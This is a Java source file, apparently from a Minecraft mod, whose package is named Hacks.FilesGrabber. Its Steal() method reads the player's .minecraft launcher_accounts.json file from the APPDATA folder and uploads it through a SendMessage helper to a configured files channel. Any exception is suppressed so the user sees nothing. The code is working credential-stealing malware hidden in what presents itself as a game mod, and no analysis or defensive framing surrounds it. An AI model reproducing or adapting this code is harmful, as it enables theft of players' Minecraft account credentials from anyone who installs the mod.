package com.example.examplemod.Hacks.FilesGrabber.LauncherAccounts;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class LauncherAccounts {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\launcher_accounts.json"));
         SendMessage.doThing("```LauncherAccaunts ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol321");
      }

   }
}
